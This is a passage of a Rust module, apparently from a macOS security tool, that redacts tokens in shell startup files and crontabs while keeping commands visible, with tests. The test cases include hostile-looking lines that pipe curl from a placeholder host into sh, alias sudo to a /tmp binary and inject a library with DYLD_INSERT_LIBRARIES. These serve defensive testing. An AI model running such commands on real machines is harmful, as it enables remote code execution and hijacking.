//! Hiding the values a startup file assigns, so its tokens never reach the bundle while what it
//! runs does.
//!
//! The shell decides what is a value and what runs, so this follows its lexing closely enough
//! in both directions: a value read too short leaks a token into the bundle, and one read too
//! long hides a command from the agent, which a planted line could use (`# TOKEN="` followed by
//! `curl ... | sh`). It works in two steps.
//!
//! 1. [`logical_lines`] joins the physical lines the shell reads as one: a quote, `$(...)`,
//!    `(...)` or `${...}` left open, or a backslash at the end. A comment ends at its line and
//!    carries nothing over. A here-document's body lines are kept apart, each its own line, in
//!    which quotes mean nothing ([`redact_body`]).
//! 2. [`redact`] scans each logical line, knowing for every byte whether it is at the top
//!    level, in a comment, or inside quotes ([`Context`]). An assignment's value at the top
//!    level is a whole shell word ([`value_end`]), which may span the joined lines; one nested
//!    in a comment or in quotes (`alias gh='GH_TOKEN=x gh'`) also ends where that context does,
//!    and at the end of its physical line at the latest, so a mismatch with the shell inside
//!    quotes can never swallow a line.
//!
//! That is for shell code: startup files and `periodic` scripts. A crontab is read a line at a
//! time as cron does ([`redact_crontab`]), and a path list is shown as it is: neither is shell
//! code, and joining their lines on a quote would hide a job or a folder.
//!
//! Some values are shown, because what they hold runs or decides what runs ([`shows`]).
//!
//! A hidden value keeps its newlines, each line of it reading `(hidden)`, so the redacted
//! logical line splits back into as many lines as it joined and line numbers match the file.
//! A line the agent should not trust to be complete says so in words: one longer than
//! [`LINE_LIMIT`], and commands nested deeper than [`DEPTH_LIMIT`].

use crate::inventory::host::shows_value;

/// What replaces a hidden value.
const HIDDEN: &str = "(hidden)";

/// Names whose value is code the shell runs or a path it reads code from, shown whole as
/// `PATH` is: zsh's `path` and `fpath` arrays (tied to `PATH` and `FPATH`), the prompts (bash
/// and zsh expand commands in them on every prompt), `PROMPT_COMMAND`, zsh's `functions` table
/// and hook arrays, and the files a shell reads at start (`BASH_ENV`, `ENV`, `ZDOTDIR`).
const CODE_NAMES: [&str; 24] = [
    "FPATH",
    "path",
    "fpath",
    "PS0",
    "PS1",
    "PS2",
    "PS3",
    "PS4",
    "PROMPT",
    "PROMPT2",
    "PROMPT3",
    "PROMPT4",
    "RPROMPT",
    "RPROMPT2",
    "RPS1",
    "RPS2",
    "PROMPT_COMMAND",
    "functions",
    "precmd_functions",
    "preexec_functions",
    "chpwd_functions",
    "BASH_ENV",
    "ENV",
    "ZDOTDIR",
];

/// Whether the value assigned to `name` is shown whole: `PATH`, `DYLD_` variables (as for
/// launch items) and [`CODE_NAMES`].
fn shows(name: &str) -> bool {
    shows_value(name) || CODE_NAMES.contains(&name)
}

/// What syntax a file's lines are in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) enum Syntax {
    /// Shell code: zsh's and bash's startup files and `periodic`'s scripts.
    Shell,
    /// A crontab: a line is a job or `NAME = value`, read on its own (crontab(5)).
    Crontab,
    /// One folder per line, for `path_helper`: nothing to hide.
    PathList,
}

/// The longest logical line scanned, in bytes. Arbitrary: a real startup line is under a
/// kilobyte and a pasted key a few, and the bound keeps a planted line from making the scan's
/// quadratic cases (an unclosed `$(` rescanned at each one) slow.
const LINE_LIMIT: usize = 16 * 1024;

/// The deepest commands inside a value that are redacted, each a recursive call. Arbitrary: a
/// real line nests two or three, and the bound keeps a planted one from overflowing the stack.
const DEPTH_LIMIT: usize = 32;

/// The bytes after which a word starts, so an unquoted `#` there starts a comment and an
/// assignment's name may begin. One list for both, as the shell has.
const WORD_BREAK: &[u8] = b" \t\n;&|()";

/// Where a byte of a line is, for the shell.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Context {
    Top,
    /// After an unquoted `#` that starts a word, to the end of the physical line.
    Comment,
    /// Inside `'...'`, which has no escapes.
    Single,
    /// Inside `"..."`, where a backslash escapes.
    Double,
    /// Inside `$'...'`, where a backslash escapes.
    AnsiC,
    /// Inside a backquoted command.
    Backquote,
}

impl Context {
    /// The context after the byte at `at` of `text`, and how many bytes it takes (two for an
    /// escape or an opener such as `$'`). An unquoted `#` starts a comment only at the start of
    /// a word ([`WORD_BREAK`]).
    fn step(self, text: &[u8], at: usize) -> (Self, usize) {
        let byte = text[at];
        let next = text.get(at + 1).copied();
        let word_start = at == 0 || WORD_BREAK.contains(&text[at - 1]);
        match (self, byte) {
            (Self::Top | Self::Double | Self::AnsiC | Self::Backquote, b'\\') => (self, 2),
            (Self::Top, b'#') if word_start => (Self::Comment, 1),
            (Self::Top, b'\'') => (Self::Single, 1),
            (Self::Top, b'"') => (Self::Double, 1),
            (Self::Top, b'$') if next == Some(b'\'') => (Self::AnsiC, 2),
            (Self::Top, b'`') => (Self::Backquote, 1),
            (Self::Single | Self::AnsiC, b'\'')
            | (Self::Double, b'"')
            | (Self::Backquote, b'`')
            | (Self::Comment, b'\n') => (Self::Top, 1),
            _ => (self, 1),
        }
    }

    /// Where a value nested in this context must end at the latest, in `text` that starts
    /// inside it: at its closing quote or backquote, or the end of its physical line.
    fn close(self, text: &str) -> usize {
        let bytes = text.as_bytes();
        let mut at = 0;
        let mut context = self;
        while at < bytes.len() && bytes[at] != b'\n' {
            let (after, len) = context.step(bytes, at);
            if after == Self::Top {
                return at;
            }
            context = after;
            at = advance(text, at, len);
        }
        at.min(text.len())
    }
}

/// `at` moved on by `len` bytes, to the next character boundary of `text`: an escape is two
/// bytes, and the second may start a longer character.
fn advance(text: &str, at: usize, len: usize) -> usize {
    let mut next = (at + len).min(text.len());
    while !text.is_char_boundary(next) {
        next += 1;
    }
    next
}

/// A line as the shell reads it.
#[derive(Debug)]
enum Logical {
    /// Shell code over this many physical lines, joined with `\n`.
    Code(String, usize),
    /// One line of a here-document's body, and whether the body expands commands (its word
    /// was not quoted).
    Body(String, bool),
}

/// The logical lines of `text`.
fn logical_lines(text: &str) -> Vec<Logical> {
    let mut logical = Vec::new();
    let mut current = String::new();
    let mut count = 0;
    let mut context = Context::Top;
    let mut depth = 0_usize;
    // Here-documents named on this physical line, and those whose bodies are being read.
    let mut pending: Vec<Delimiter> = Vec::new();
    let mut bodies: Vec<Delimiter> = Vec::new();
    for line in text.lines() {
        if let Some(body) = bodies.first() {
            let end = body.ends(line);
            logical.push(Logical::Body(line.to_owned(), body.expands));
            if end {
                bodies.remove(0);
            }
            continue;
        }
        if count > 0 {
            current.push('\n');
        }
        current.push_str(line);
        count += 1;
        let bytes = line.as_bytes();
        let mut at = 0;
        let mut continued = false;
        while at < bytes.len() {
            if context == Context::Top {
                match bytes[at] {
                    b'(' | b'{' if at > 0 && bytes[at - 1] == b'$' => depth += 1,
                    b'(' => depth += 1,
                    b')' | b'}' => depth = depth.saturating_sub(1),
                    b'\\' if at + 1 == bytes.len() => continued = true,
                    b'<' => pending.extend(Delimiter::at(line, at)),
                    _ => {}
                }
            }
            let (after, len) = context.step(bytes, at);
            context = after;
            at += len;
        }
        if context == Context::Comment {
            context = Context::Top;
        }
        // An escape that ends a line inside double quotes joins it too.
        if matches!(context, Context::Double | Context::AnsiC) && line.ends_with('\\') {
            continued = true;
        }
        let ends = context == Context::Top && depth == 0 && !continued;
        // A body starts on the next physical line whatever is open, so the line that names it
        // ends here, read as the shell would up to this point.
        if ends || !pending.is_empty() {
            logical.push(Logical::Code(std::mem::take(&mut current), count));
            count = 0;
            context = Context::Top;
            depth = 0;
            bodies.append(&mut pending);
        }
    }
    if count > 0 {
        logical.push(Logical::Code(current, count));
    }
    logical
}

/// The word that ends a here-document, whether its lines may be indented with tabs, and
/// whether its body expands commands, which a quoted word turns off.
#[derive(Debug)]
struct Delimiter {
    word: String,
    tabs: bool,
    expands: bool,
}

impl Delimiter {
    /// The here-document that `<<` at byte `at` of `line` opens: `<<WORD` or `<<-WORD`, the word
    /// quoted or not. Not `<<<`, a here-string. Only a word of letters, digits and `_` is taken,
    /// so a shift such as `$((1<<2))` is not one.
    fn at(line: &str, at: usize) -> Option<Self> {
        let rest = line[at..].strip_prefix("<<")?;
        if rest.starts_with('<') || line[..at].ends_with('<') {
            return None;
        }
        let (tabs, rest) = match rest.strip_prefix('-') {
            Some(rest) => (true, rest),
            None => (false, rest),
        };
        let rest = rest.trim_start_matches([' ', '\t']);
        let unquoted = rest.strip_prefix(['\'', '"', '\\']);
        let expands = unquoted.is_none();
        let rest = unquoted.unwrap_or(rest);
        let len = rest
            .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
            .unwrap_or(rest.len());
        let word = &rest[..len];
        (!word.is_empty()).then(|| Self {
            word: word.to_owned(),
            tabs,
            expands,
        })
    }

    /// Whether `line` is the one that ends the body.
    fn ends(&self, line: &str) -> bool {
        let line = if self.tabs {
            line.trim_start_matches('\t')
        } else {
            line
        };
        line == self.word
    }
}

/// The lines of `text`, in `syntax`, values hidden, one for each physical line.
pub(super) fn lines(text: &str, syntax: Syntax) -> Vec<String> {
    match syntax {
        Syntax::Shell => shell_lines(text),
        Syntax::Crontab => text.lines().map(redact_crontab).collect(),
        Syntax::PathList => text.lines().map(str::to_owned).collect(),
    }
}

/// The lines of shell code, values hidden, one for each physical line.
fn shell_lines(text: &str) -> Vec<String> {
    let mut shown = Vec::new();
    for logical in logical_lines(text) {
        let (text, count) = match &logical {
            Logical::Code(text, count) => (text.as_str(), *count),
            Logical::Body(text, _) => (text.as_str(), 1),
        };
        if text.len() > LINE_LIMIT {
            let note = format!(
                "(not shown: a line of {} bytes, more than the {LINE_LIMIT} Vigil reads)",
                text.len()
            );
            shown.extend(std::iter::repeat_n(note, count));
            continue;
        }
        let redacted = match &logical {
            Logical::Code(text, _) => redact(text, 0),
            Logical::Body(text, expands) => redact_body(text, *expands),
        };
        let mut pieces: Vec<String> = redacted.split('\n').map(str::to_owned).collect();
        debug_assert_eq!(pieces.len(), count, "a hidden value keeps its newlines");
        pieces.resize(count, HIDDEN.to_owned());
        shown.extend(pieces);
    }
    shown
}

/// `text`, one logical line, with the literal part of every assigned value replaced by
/// `(hidden)`, wherever the assignment is: after `;`, `&&` or `then`, inside quotes, in a
/// comment, or inside a command a value runs (`$(GH_TOKEN=x gh api user)`). An assignment is a
/// name at a word boundary followed by `=` or `+=`, a default or alternative in a parameter
/// expansion (`${T:=x}`, `${T:-x}`, `${T::=x}`, `${T:+x}`), or `launchctl setenv NAME value`
/// ([`assignment_at`]). A value of `PATH`, `FPATH` or a `DYLD_` variable is shown; in any
/// other, each command it runs (`$(...)`, backquotes, `<(...)`) is shown, itself redacted, and
/// the text around them is hidden. `depth` is how many commands deep this text is.
///
/// Not hidden: a value passed as an argument (`--token=x` after a dash, `gh auth login
/// --with-token x`), one written to a file (`echo x > ~/.token`), and one that closes the
/// quotes around its assignment and goes on outside them (`alias a='A='x''`), which the shell
/// joins but this ends at the quote.
fn redact(text: &str, depth: usize) -> String {
    if depth > DEPTH_LIMIT {
        let note = format!("(not shown: commands nested more than {DEPTH_LIMIT} deep)");
        return keeping_lines(text, &note);
    }
    let bytes = text.as_bytes();
    let mut out = String::with_capacity(text.len());
    let mut context = Context::Top;
    let mut at = 0;
    let mut copied = 0;
    while at < bytes.len() {
        if let Some(found) = assignment_at(text, at) {
            let value = &text[found.value..];
            let mut end = match found.form {
                Form::Word => value_end(value, context == Context::Double),
                Form::Braced => brace_end(value),
            };
            if context != Context::Top {
                end = end.min(context.close(value));
            }
            out.push_str(&text[copied..found.value]);
            out.push_str(&shown_value(found.name, &value[..end], depth));
            at = found.value + end;
            copied = at;
            continue;
        }
        let (after, len) = context.step(bytes, at);
        context = after;
        at = advance(text, at, len);
    }
    out.push_str(&text[copied..]);
    out
}

/// A here-document's body line with each assigned value hidden up to the next white space:
/// quotes mean nothing in a body, so they open nothing (`Don't` starts no string), and a body
/// line carries nothing to the next. When the body `expands`, a command in a value runs as the
/// body is read, so it is shown, itself redacted, and white space inside it does not end the
/// value.
fn redact_body(line: &str, expands: bool) -> String {
    let mut out = String::with_capacity(line.len());
    let mut at = 0;
    let mut copied = 0;
    while at < line.len() {
        let Some(found) = assignment_at(line, at) else {
            at = advance(line, at, 1);
            continue;
        };
        let value = &line[found.value..];
        let mut end = 0;
        let mut shown = String::new();
        let mut hiding = false;
        while end < value.len() && !value[end..].starts_with([' ', '\t']) {
            let command = if expands {
                command_end(&value[end..])
            } else {
                0
            };
            if command > 0 {
                shown.push_str(&redact(&value[end..end + command], 1));
                hiding = false;
                end += command;
                continue;
            }
            if !hiding {
                shown.push_str(HIDDEN);
                hiding = true;
            }
            end = advance(value, end, 1);
        }
        out.push_str(&line[copied..found.value]);
        if shows(found.name) {
            out.push_str(&value[..end]);
        } else {
            out.push_str(&shown);
        }
        at = found.value + end;
        copied = at;
    }
    out.push_str(&line[copied..]);
    out
}

/// A crontab line with its values hidden. An environment line, `NAME = value`, holds its value
/// to the end of the line, spaces included, with no comments (crontab(5)), so all of it is
/// hidden. A job's command is run by `sh`, so it is redacted as shell code on its own line: a
/// quote cron would not continue opens nothing on the next.
fn redact_crontab(line: &str) -> String {
    let trimmed = line.trim_start();
    let name_len = trimmed
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(trimmed.len());
    let after = trimmed[name_len..].trim_start_matches([' ', '\t']);
    let is_env = name_len > 0
        && !trimmed.starts_with(|c: char| c.is_ascii_digit())
        && after.starts_with('=');
    if is_env && !trimmed.starts_with('#') {
        let value = after[1..].trim_start_matches([' ', '\t']);
        let shown_name = &trimmed[..name_len];
        if value.is_empty() || shows(shown_name) {
            return line.to_owned();
        }
        let kept = line.len() - value.len();
        return format!("{}{HIDDEN}", &line[..kept]);
    }
    shell_lines(line).join(" ")
}

/// `note` in place of `text`, and `(hidden)` for each further line it spans.
fn keeping_lines(text: &str, note: &str) -> String {
    let mut out = note.to_owned();
    for _ in text.matches('\n') {
        out.push('\n');
        out.push_str(HIDDEN);
    }
    out
}

/// An assignment [`assignment_at`] found.
#[derive(Debug)]
struct Found<'a> {
    name: &'a str,
    /// Where its value starts.
    value: usize,
    form: Form,
}

/// How an assignment's value ends.
#[derive(Debug)]
enum Form {
    /// At the end of a shell word ([`value_end`]).
    Word,
    /// At the `}` of a parameter expansion ([`brace_end`]).
    Braced,
}

/// The assignment that starts at byte `at` of `text`, if one does: a name
/// (`[A-Za-z_][A-Za-z0-9_]*`, with any `[subscript]`) at a word boundary followed by `=` (not
/// `==`) or `+=`; right after `${`, followed by `::=`, `:=`, `:-`, `:+`, `=`, `-` or `+`; or
/// `launchctl setenv NAME value`. At the start of a line, spaces may surround the `=`, as
/// crontab(5) allows. A boundary is the start of the text or any character that cannot
/// continue a name or an option: not a letter, digit, `_`, `-`, `$` or `.`. A name after the
/// word `alias` is the alias's, whose definition is a command, and is skipped; an assignment
/// inside its quotes is still found as the scan goes on.
fn assignment_at(text: &str, at: usize) -> Option<Found<'_>> {
    let bytes = text.as_bytes();
    let before = at.checked_sub(1).map(|b| bytes[b]);
    if before.is_some_and(|b| b.is_ascii_alphanumeric() || b"_-$.".contains(&b)) {
        return None;
    }
    let line_before = text[..at].rsplit('\n').next().unwrap_or("");
    if after_alias(line_before) {
        return None;
    }
    if let Some(found) = launchctl_setenv(text, at) {
        return Some(found);
    }
    // A name may be quoted whole (`export "TOKEN"=x`), which the shell takes as the name.
    let quote = text[at..]
        .chars()
        .next()
        .filter(|c| matches!(c, '"' | '\''));
    let name_at = at + quote.map_or(0, char::len_utf8);
    let name_len = text[name_at..]
        .find(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .unwrap_or(text.len() - name_at);
    let name = &text[name_at..name_at + name_len];
    if name.is_empty() || name.starts_with(|c: char| c.is_ascii_digit()) {
        return None;
    }
    let mut after = &text[name_at + name_len..];
    if let Some(quote) = quote {
        after = after.strip_prefix(quote)?;
    }
    if quote.is_none() && in_expansion(&text[..at]) {
        let operator = ["::=", ":=", ":-", ":+", "=", "-", "+"]
            .into_iter()
            .find(|op| after.starts_with(op))?;
        let value = text.len() - after.len() + operator.len();
        return Some(Found {
            name,
            value,
            form: Form::Braced,
        });
    }
    // A subscript (`secrets[github]=x`, zsh and bash arrays) belongs to the name, nested
    // brackets included.
    if after.starts_with('[') {
        after = &after[subscript_end(after)?..];
    }
    let operator = ["+=", "="].into_iter().find(|op| after.starts_with(op))?;
    if after[operator.len()..].starts_with('=') {
        return None;
    }
    let value = &after[operator.len()..];
    Some(Found {
        name,
        value: text.len() - value.len(),
        form: Form::Word,
    })
}

/// Whether the text before a name, on its line, ends with the word `alias` and any options
/// (`alias -g`, `alias --`): the name is then the alias's.
fn after_alias(line_before: &str) -> bool {
    let mut words: Vec<&str> = line_before
        .split([' ', '\t'])
        .filter(|w| !w.is_empty())
        .collect();
    while words.last().is_some_and(|w| w.starts_with('-')) {
        words.pop();
    }
    words.last().is_some_and(|word| {
        let word = word.rsplit([';', '&', '|', '(']).next().unwrap_or(word);
        word == "alias"
    })
}

/// Whether `before` ends inside a parameter expansion where a name comes next: `${`, or zsh's
/// `${(flags)` (`${(q)TOKEN:=x}`).
fn in_expansion(before: &str) -> bool {
    if before.ends_with("${") {
        return true;
    }
    before
        .strip_suffix(')')
        .and_then(|rest| {
            rest.rfind("${(")
                .map(|at| !rest[at + 3..].contains(['(', ')', '}']))
        })
        .unwrap_or(false)
}

/// Where the subscript `text` starts with (`[...]`) ends, past its `]`, nested brackets
/// counted and quoted text skipped.
fn subscript_end(text: &str) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut depth = 0_usize;
    let mut context = Context::Top;
    let mut at = 0;
    while at < bytes.len() {
        if context == Context::Top {
            match bytes[at] {
                b'[' => depth += 1,
                b']' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(at + 1);
                    }
                }
                _ => {}
            }
        }
        let (after, len) = context.step(bytes, at);
        context = after;
        at = advance(text, at, len);
    }
    None
}

/// `launchctl setenv NAME value` starting at byte `at` of `text`.
fn launchctl_setenv(text: &str, at: usize) -> Option<Found<'_>> {
    let tail = text[at..]
        .strip_prefix("launchctl")?
        .trim_start_matches([' ', '\t'])
        .strip_prefix("setenv")?;
    let name_at = text.len() - tail.trim_start_matches([' ', '\t']).len();
    let name_len = text[name_at..]
        .find(char::is_whitespace)
        .unwrap_or(text.len() - name_at);
    let value_at = name_at + name_len;
    let space = text[value_at..].len() - text[value_at..].trim_start_matches([' ', '\t']).len();
    Some(Found {
        name: &text[name_at..value_at],
        value: value_at + space,
        form: Form::Word,
    })
}

/// The value as the bundle shows it (see [`redact`]): each command in it redacted, and, unless
/// the name's value is shown, each run of other text replaced by `(hidden)`, a run over several
/// lines by one on each line. A command is one the shell would run: `$(...)` or backquotes
/// outside single quotes, not escaped, and closed.
fn shown_value(name: &str, value: &str, depth: usize) -> String {
    let literal_shown = shows(name);
    let bytes = value.as_bytes();
    let mut shown = String::new();
    let mut hiding = false;
    let mut context = Context::Top;
    let mut at = 0;
    while at < bytes.len() {
        let runs = matches!(context, Context::Top | Context::Double);
        let command = if runs { command_end(&value[at..]) } else { 0 };
        if command > 0 {
            shown.push_str(&redact(&value[at..at + command], depth + 1));
            hiding = false;
            at += command;
            continue;
        }
        let (after, len) = context.step(bytes, at);
        context = after;
        let next = advance(value, at, len);
        if literal_shown {
            shown.push_str(&value[at..next]);
        } else {
            for c in value[at..next].chars() {
                if c == '\n' {
                    shown.push('\n');
                    hiding = false;
                } else if !hiding {
                    shown.push_str(HIDDEN);
                    hiding = true;
                }
            }
        }
        at = next;
    }
    shown
}

/// The length of the closed command `text` starts with (`$(...)`, `<(...)` or a backquoted
/// one), or 0. One not closed in `text` is not a command here: its text is a value's.
fn command_end(text: &str) -> usize {
    if text.starts_with("$(") || text.starts_with("<(") {
        return group_close(&text[2..]).map_or(0, |end| 2 + end);
    }
    if let Some(inner) = text.strip_prefix('`') {
        return inner.find('`').map_or(0, |at| at + 2);
    }
    0
}

/// Where a group one level deep at the start of `text` closes, past its `)`, nested groups and
/// quoted text skipped. `None` when it does not close.
fn group_close(text: &str) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut depth = 1_usize;
    let mut context = Context::Top;
    let mut at = 0;
    while at < bytes.len() {
        if context == Context::Top {
            match bytes[at] {
                b'(' => depth += 1,
                b')' => {
                    depth -= 1;
                    if depth == 0 {
                        return Some(at + 1);
                    }
                }
                _ => {}
            }
        }
        let (after, len) = context.step(bytes, at);
        context = after;
        at = advance(text, at, len);
    }
    None
}

/// Where a parameter expansion's value ends: at its `}`, nested braces counted and quoted text
/// skipped, or at the end of the text.
fn brace_end(text: &str) -> usize {
    let bytes = text.as_bytes();
    let mut depth = 1_usize;
    let mut context = Context::Top;
    let mut at = 0;
    while at < bytes.len() {
        // A `}` inside a command (`${T:=$(echo })x}`) is the command's.
        let command = if context == Context::Top {
            command_end(&text[at..])
        } else {
            0
        };
        if command > 0 {
            at += command;
            continue;
        }
        if context == Context::Top {
            match bytes[at] {
                b'{' => depth += 1,
                b'}' => {
                    depth -= 1;
                    if depth == 0 {
                        return at;
                    }
                }
                _ => {}
            }
        }
        let (after, len) = context.step(bytes, at);
        context = after;
        at = advance(text, at, len);
    }
    text.len()
}

/// Where the shell word `text` starts with ends: at unquoted white space (a newline included)
/// or a control character (`;`, `&`, `|`, `<`, `>`, `(`, `)`). A word that starts with `(` is
/// the group it opens (an array). Quoted text, escapes (a backslash and newline joins the next
/// line to the word), `$(...)` and backquoted commands are part of the word.
///
/// `in_double` says the word is inside double quotes, as in `sh -c "TOKEN=\"a b\" cmd"`: its
/// escaped quotes are the quotes the inner shell will see, so they group the word too.
fn value_end(text: &str, in_double: bool) -> usize {
    if let Some(inner) = text.strip_prefix('(') {
        return group_close(inner).map_or(text.len(), |end| 1 + end);
    }
    let bytes = text.as_bytes();
    let mut context = Context::Top;
    let mut escaped_quote = false;
    let mut at = 0;
    while at < bytes.len() {
        if in_double && bytes[at] == b'\\' && bytes.get(at + 1) == Some(&b'"') {
            escaped_quote = !escaped_quote;
            at += 2;
            continue;
        }
        if context == Context::Top && !escaped_quote {
            let command = command_end(&text[at..]);
            if command > 0 && bytes[at] != b'<' {
                at += command;
                continue;
            }
            if b" \t\n;&|<>()".contains(&bytes[at]) {
                return at;
            }
        }
        let (after, len) = context.step(bytes, at);
        context = after;
        at = advance(text, at, len);
    }
    text.len()
}

#[cfg(test)]
mod tests {
    use super::*;

    /// Shell code's lines, as most tests read.
    fn lines(text: &str) -> Vec<String> {
        super::lines(text, Syntax::Shell)
    }

    fn one(line: &str) -> String {
        lines(line).join("\n")
    }

    #[test]
    fn literal_values_are_hidden_and_what_runs_is_shown() {
        let cases = [
            (
                "export GITHUB_TOKEN=ghp_abc123",
                "export GITHUB_TOKEN=(hidden)",
            ),
            ("  TOKEN=\"a b c\" make", "  TOKEN=(hidden) make"),
            ("export A='x y' B=2", "export A=(hidden) B=(hidden)"),
            (
                "typeset -x KEY=v1; echo hi",
                "typeset -x KEY=(hidden); echo hi",
            ),
            (
                "export PATH=\"/tmp/bin:$PATH\"",
                "export PATH=\"/tmp/bin:$PATH\"",
            ),
            ("FPATH=/x:$FPATH", "FPATH=/x:$FPATH"),
            (
                "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
                "export DYLD_INSERT_LIBRARIES=/tmp/x.dylib",
            ),
            (
                "export X=$(curl -s https://e.x | sh)",
                "export X=$(curl -s https://e.x | sh)",
            ),
            ("X=`id`", "X=`id`"),
            (
                "export X=$(echo $(id)) Y=z",
                "export X=$(echo $(id)) Y=(hidden)",
            ),
            (
                "export AUTH=\"Bearer s $(date)\"",
                "export AUTH=(hidden)$(date)(hidden)",
            ),
            ("PATH+=:/opt", "PATH+=:/opt"),
            ("A+=secret", "A+=(hidden)"),
            ("EMPTY=", "EMPTY="),
            ("X=a\\ b c", "X=(hidden) c"),
            (
                "alias sudo='sudo -E /tmp/evil'",
                "alias sudo='sudo -E /tmp/evil'",
            ),
            (
                "curl -fsSL https://e.x/i.sh | sh",
                "curl -fsSL https://e.x/i.sh | sh",
            ),
            (
                "gh auth login --with-token abc",
                "gh auth login --with-token abc",
            ),
            ("run --token=abc", "run --token=abc"),
            ("exporter=1", "exporter=(hidden)"),
            ("export", "export"),
            ("1A=x", "1A=x"),
            (
                "[[ $X == y ]] && [ \"$a\" = b ]",
                "[[ $X == y ]] && [ \"$a\" = b ]",
            ),
            ("echo ${X:=d}", "echo ${X:=(hidden)}"),
            ("echo ${X}", "echo ${X}"),
            ("*/5 * * * * /tmp/x.sh", "*/5 * * * * /tmp/x.sh"),
            ("MAILTO=me@example.com", "MAILTO=(hidden)"),
        ];
        for (line, shown) in cases {
            assert_eq!(one(line), shown, "{line}");
        }
    }

    #[test]
    fn an_assignment_anywhere_on_a_line_is_hidden() {
        let cases = [
            // Found leaking by the reviews of PR #75.
            (
                "export A=a; export B=s",
                "export A=(hidden); export B=(hidden)",
            ),
            (
                "[ -n \"$CI\" ] || export T=s",
                "[ -n \"$CI\" ] || export T=(hidden)",
            ),
            (
                "if [ x ]; then export T=s; fi",
                "if [ x ]; then export T=(hidden); fi",
            ),
            (
                "alias gh='GH_TOKEN=s gh'",
                "alias gh='GH_TOKEN=(hidden) gh'",
            ),
            (
                "gh() { GH_TOKEN=s command gh \"$@\"; }",
                "gh() { GH_TOKEN=(hidden) command gh \"$@\"; }",
            ),
            ("env TOKEN=s cmd", "env TOKEN=(hidden) cmd"),
            (
                "0 * * * * GITHUB_TOKEN=s /usr/local/bin/b",
                "0 * * * * GITHUB_TOKEN=(hidden) /usr/local/bin/b",
            ),
            ("# export OLD_TOKEN=s", "# export OLD_TOKEN=(hidden)"),
            ("KEYS=(s1 s2)", "KEYS=(hidden)"),
            ("typeset -A s=(gh s12)", "typeset -A s=(hidden)"),
            (
                "export AA=x>/dev/null Z=s",
                "export AA=(hidden)>/dev/null Z=(hidden)",
            ),
            (
                "//registry.npmjs.org/:_authToken=npm_s",
                "//registry.npmjs.org/:_authToken=(hidden)",
            ),
            ("export \"TOKEN=s\"", "export \"TOKEN=(hidden)\""),
            (
                "launchctl setenv TOKEN s",
                "launchctl setenv TOKEN (hidden)",
            ),
            (
                "https://x.example/?token=s&b=2",
                "https://x.example/?token=(hidden)&b=(hidden)",
            ),
            ("secrets[github]=s", "secrets[github]=(hidden)"),
            // Found by the second review of PR #75.
            (": ${GITHUB_TOKEN:=s}", ": ${GITHUB_TOKEN:=(hidden)}"),
            (
                "gh --token ${GH_TOKEN:-s} x",
                "gh --token ${GH_TOKEN:-(hidden)} x",
            ),
            (
                "export U=$(GH_TOKEN=s gh api user)",
                "export U=$(GH_TOKEN=(hidden) gh api user)",
            ),
            ("export X=`TOKEN=s cmd`", "export X=`TOKEN=(hidden) cmd`"),
            (
                "export PATH=\"$(T=s h):$PATH\"",
                "export PATH=\"$(T=(hidden) h):$PATH\"",
            ),
            ("export AUTH=\"x \\\" s\"", "export AUTH=(hidden)"),
            ("launchctl setenv e s", "launchctl setenv e (hidden)"),
            (
                "sh -c \"TOKEN=\\\"abc s3cret\\\" cmd\"",
                "sh -c \"TOKEN=(hidden) cmd\"",
            ),
            ("galias TOKEN=s", "galias TOKEN=(hidden)"),
            // Found by the third review of PR #75: quotes stop a command, and braces in quotes.
            (
                "export DB_PASSWORD='aB3}xY9`qZ'",
                "export DB_PASSWORD=(hidden)",
            ),
            (
                "export DB_PASSWORD=\"hunter\\`2secret\"",
                "export DB_PASSWORD=(hidden)",
            ),
            ("PW='abc$(xyz)'", "PW=(hidden)"),
            ("echo ${T:=\"a}s\"}", "echo ${T:=(hidden)}"),
            (": ${GITHUB_TOKEN::=s}", ": ${GITHUB_TOKEN::=(hidden)}"),
            ("echo ${T:+s} ${U+s}", "echo ${T:+(hidden)} ${U+(hidden)}"),
            (
                "export AUTH=\"Bearer s $(date)\"",
                "export AUTH=(hidden)$(date)(hidden)",
            ),
            ("X=`date`; A=s", "X=`date`; A=(hidden)"),
            ("X=a\\", "X=(hidden)"),
            ("CONFIG='{\"q\":\"$(whoami)\"}'", "CONFIG=(hidden)"),
        ];
        for (line, shown) in cases {
            assert_eq!(one(line), shown, "{line}");
        }
    }

    #[test]
    fn a_value_that_spans_lines_hides_them_and_nothing_after() {
        let h = HIDDEN;
        let key =
            "export KEY=\"-----BEGIN KEY-----\nAAAAsecret\n-----END-----\" && echo ok\nnext=1\n";
        assert_eq!(
            lines(key),
            [
                "export KEY=(hidden)",
                h,
                "(hidden) && echo ok",
                "next=(hidden)"
            ]
        );
        let array = "KEYS=(\n  s1\n  s2\n)\necho done\n";
        assert_eq!(lines(array), ["KEYS=(hidden)", h, h, h, "echo done"]);
        // The shell joins a line ending in a backslash; an indented word after it is a word of
        // its own, as there.
        assert_eq!(
            lines("export T=\\\n  s\necho\n"),
            ["export T=(hidden)", "  s", "echo"]
        );
        // A closing quote's word goes on, and an escaped quote does not close it.
        assert_eq!(
            lines("X=\"a\nb \\\" c\"d e\n"),
            ["X=(hidden)", "(hidden) e"]
        );
        // Quoted text in an array, a `)` included, does not close it.
        assert_eq!(lines("K=(\n\")\" s\n)\n"), ["K=(hidden)", h, h]);
        // Text inside a shown value's quotes is the value's, not an assignment.
        assert_eq!(lines("PATH=\"/a\nb=1\"\n"), ["PATH=\"/a", "b=1\""]);
        // A hidden value in the middle of a logical line keeps the later lines in place.
        let middle = "echo $(\nX=\"a\nb\"\ncurl evil\n)\n";
        assert_eq!(
            lines(middle),
            ["echo $(", "X=(hidden)", h, "curl evil", ")"]
        );
    }

    #[test]
    fn a_here_document_s_body_is_text_not_code() {
        // An apostrophe in a body opens no quote, so the token after the body is still hidden.
        let text =
            "cat <<EOF\nDon't forget\nTOKEN=s1 here\nEOF\nexport GITHUB_TOKEN='s2'\necho done\n";
        assert_eq!(
            lines(text),
            [
                "cat <<EOF",
                "Don't forget",
                "TOKEN=(hidden) here",
                "EOF",
                "export GITHUB_TOKEN=(hidden)",
